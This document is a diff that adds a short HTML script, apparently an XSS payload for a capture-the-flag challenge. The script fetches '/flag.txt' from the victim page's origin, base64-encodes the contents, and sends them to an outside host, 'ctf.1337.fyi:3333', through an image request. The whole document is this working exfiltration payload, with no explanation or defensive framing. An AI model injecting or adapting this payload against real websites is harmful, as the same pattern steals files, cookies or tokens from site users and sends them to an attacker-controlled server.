@@ -1,0 +1,8 @@
+<script>
+fetch('/flag.txt', {mode: 'no-cors'}).then(function(r) {
+  r.text().then(function(f) {
+    var img = document.createElement('img');
+    img.src = 'http://ctf.1337.fyi:3333/' + btoa(f);
+  })
+})
+</script>
